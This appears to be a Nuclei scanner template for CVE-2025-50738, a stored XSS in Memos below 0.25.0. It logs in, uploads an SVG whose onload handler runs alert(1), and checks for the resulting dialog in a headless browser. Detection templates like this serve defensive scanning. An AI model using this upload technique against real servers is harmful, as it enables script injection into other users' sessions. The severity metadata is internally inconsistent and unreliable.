headless:
- matchers:
  - condition: and
    dsl:
    - xss_alert == true
    - xss_alert_message == "1"
    - xss_alert_type == "alert"
    type: dsl
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}/file/resources/{{resource_id}}/{{filename}}.svg'
  - action: waitdialog
    name: xss_alert
http:
- extractors:
  - group: 1
    internal: true
    name: resource_id
    part: body
    regex:
    - '"name":"resources/([A-Za-z0-9]+)"'
    type: regex
  raw:
  - 'POST /api/v1/auth/signin?username={{username}}&password={{password}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {}

    '
  - "POST /api/v1/resources HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"filename\": \"{{filename}}.svg\",\n  \"content\": \"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjwvc3ZnPg==\"\
    ,\n  \"type\": \"image/svg+xml\"\n}\n"
id: CVE-2025-50738
info:
  author: SeongHyeonJeon[nukunga]
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L
    cvss-score: 9.8
    cwe-id: CWE-200
  description: 'An authenticated attacker can upload a specially crafted SVG file
    containing JavaScript code to Memos versions prior to 0.25.0, leading to a stored
    cross-site scripting (XSS) vulnerability.

    '
  impact: 'Authenticated attackers can upload malicious SVG files containing JavaScript
    code that executes in other users'' browsers when they view the uploaded content,
    potentially stealing session tokens, credentials, or performing unauthorized actions
    on behalf of victims.

    '
  metadata:
    max-request: 3
    verified: true
  name: Memos < 0.25.0 - Stored Cross-Site Scripting
  reference:
  - https://github.com/usememos/memos/issues/4707
  - https://github.com/advisories/GHSA-hfcf-79gh-f3jc
  - https://nvd.nist.gov/vuln/detail/CVE-2025-50738
  remediation: 'Update Memos to version 0.25.0 or later that properly sanitizes SVG
    file uploads and prevents JavaScript execution.

    '
  severity: medium
  tags: cve,cve2025,xss,memos,authenticated,headless,vuln
variables:
  filename: '{{rand_base(8)}}'
  password: '{{password}}'
  username: '{{username}}'
